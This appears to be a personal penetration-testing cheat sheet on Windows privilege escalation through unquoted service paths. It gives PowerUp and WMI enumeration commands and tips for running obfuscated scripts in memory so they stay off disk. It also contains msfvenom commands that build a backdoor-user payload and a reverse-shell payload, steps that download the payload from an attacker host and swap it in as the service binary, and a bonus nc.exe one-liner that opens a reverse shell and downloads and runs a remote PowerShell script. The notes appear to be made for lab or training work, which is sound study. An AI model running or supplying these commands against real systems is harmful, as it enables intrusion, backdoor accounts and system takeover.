#### Tags: [[06 - Privilege Escalation (TA0004)]] 

## Overview | Service Misconfiguration

Unquoted Service Path exploitation Pre-requisite

	- PATH is not using Quotes and Contains Space
	- Writeable PATH: Users should have write access in one of the folders where the binary path resides
	- Executes as LocalSystem
	- Users should have the right to restart the Service
## Enumeration 

### Script Enumeration
- Import script in memory & Do not touch the disk
- PowerShell Script Obfuscation Tools: https://github.com/JoelGMSec/Invoke-Stealth
```markdown
# PowerUp Obfuscated
GitHub Fetch Scipt > Execute! 
[RT GitHub: PScriptsObs: Scripts Obfuscated via chameleon](https://github.com/raghavtalwar/PScriptsObs/)

# PS Scripts
*PowerUp*
powershell.exe -nop -exec bypass -c ". .\PowerUp.ps1;Get-UnquotedService"
*Winpeas*
.\winPEAS.exe quiet servicesinfo

## Find them
powershell> Get-UnquotedService
powershell> Get-ModifiableServiceFile
powershell> Get-ModifiableService

# Execure a reverse shell or adding new user as administrator.
Write-ServiceBinary -name "Service_Name" -Path "C:\Service_name.exe"
Write-ServiceBinary -Name 'SalesFarce' -Path <HijackPath>
```
### Manual Enumeration
```
##  WMI (Powershell) ##
PS:> 
Get-WmiObject win32_service | select Name,PathName,StartMode,StartName | where {$_.StartMode -ne "Disabled" -and $_.StartName -eq "LocalSystem" -and $_.PathName -notmatch "`"" -and $_.PathName -notmatch "C:\\Windows"} | Format-List

##  Windows Management Instrumentation Command-Line (WMIC)  ##
CMD:> 
wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """
```

```markdown
# Identfy service with weak permissions or unquoted paths 
CMD:> .\accesschk64.exe /accepteula -uwcqv studentuser ***
PS:> Get-WmiObject -Class win32_service | select pathname
	+ Look out for Service with Spaces and not having Quotes!

# Manually Query Service 
CMD:> sc qc "service_name"
PS:> cmd /c sc qc "BOOTP Turbo"

# AccessCHK - Sysinternals
## Check Write access to Directory under Unquoted Service PATH
C:\PrivEsc\accesschk.exe /accepteula -wuqvd "C:\Program Files\Unquoted Path Service\"
RW BUILTIN\Users
	FILE_ALL_ACCESS
# ICACLS - Inbuilt binary

```

![[Pasted image 20240330234652.png]]
## Exploitation 
### Create Malicious Service
```markdown
# Add User Exploiation
msfvenom -p windows/adduser USER=backdoor PASS=backdoor -f exe > service.exe

# Reverse Shell Exploitation
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f exe -o reverse.exe
```
### Replace Service
#### Fetch the reverse.exe executable & Rename Correctly  >>  SMB
`copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"
`Ren "C:\Program Files\Unquoted Path Service\Common.exe" Unquoted.exe
#### Fetch the reverse.exe executable & Copy Correctly  >>  HTTP
`IWR -Uri 'http://10.0.2.54:90/reverse.exe' -Outfile "BOOTP.exe"
`copy C:\Temp\BOOTP.exe "C:\Program Files\BOOTP.exe"
### Start the service post modification of PATH
- Restart Service
	- `net stop <service>`
	- `net start <service>`
	or
	- `sc stop service_name
	- `sc start service_name`
- If unable to start the service try rebooting machine
	- `shutdown /r /t 0`

## Resources

```markdown
```

#### Notes | Bonus
- Create Links to this Page! 
##### Spawn Powershell from Command Injection Vulnerability
`\\10.0.2.54\kali\nc.exe 10.0.2.54 443 -e "cmd.exe /c C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nop -ep bypass iex(new-object net.webclient).downloadstring('http://10.0.2.54/Invoke-PowerShellTcp.ps1')"`
	+ Bypass Execution Policy as well!